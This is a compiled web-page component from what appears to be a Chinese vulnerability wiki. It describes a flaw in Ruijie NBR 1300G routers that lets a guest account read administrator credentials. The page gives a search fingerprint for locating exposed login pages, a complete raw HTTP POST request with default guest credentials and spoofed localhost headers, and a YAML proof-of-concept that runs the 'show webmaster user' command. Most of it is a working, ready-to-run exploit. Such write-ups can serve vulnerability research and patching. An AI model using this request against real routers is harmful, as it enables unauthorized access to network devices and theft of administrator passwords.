import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as d,c as l,a as e,b as i,d as r,e as t}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),u=e("p",null,"锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞，guest 账户可以越权获取管理员账号密码",-1),m=e("p",null,"参考链接：",-1),v={href:"https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml",target:"_blank",rel:"noopener noreferrer"},b=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>锐捷 NBR 路由器
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;锐捷网络 --NBR路由器--登录界面&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/file-20240904113419711.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行 CLI 命令 <code>show webmaster user</code> 查看用户配置账号密码：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: 
Connection: keep-alive
Content-Length: 73
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: auth=; user=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1

command=show%webmaster%user&amp;strurl=exec%04&amp;mode=%02PRIV_EXEC&amp;signname=Red-Giant.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/file-20240904112924288.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2><p>xpoc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>name: poc-yaml-ruijie-nbr1300g-cli-password-leak
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /WEB_VMS/LEVEL15/
            headers:
                Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
            body: |
                command=show webmaster user&amp;strurl=exec%04&amp;mode=%02PRIV_EXEC&amp;signname=Red-Giant.
            follow_redirects: false
        expression: response.status == 200 &amp;&amp; response.body.bcontains(bytes(&quot;webmaster level 2 username guest password guest&quot;))
expression: r0()
detail:
    author: abbin777
    links:
        - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13);function p(h,_){const n=s("ExternalLinkIcon");return d(),l("div",null,[o,u,m,e("ul",null,[e("li",null,[e("a",v,[i("https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml"),r(n)])])]),b])}const E=a(c,[["render",p],["__file","锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞.html.vue"]]);export{E as default};
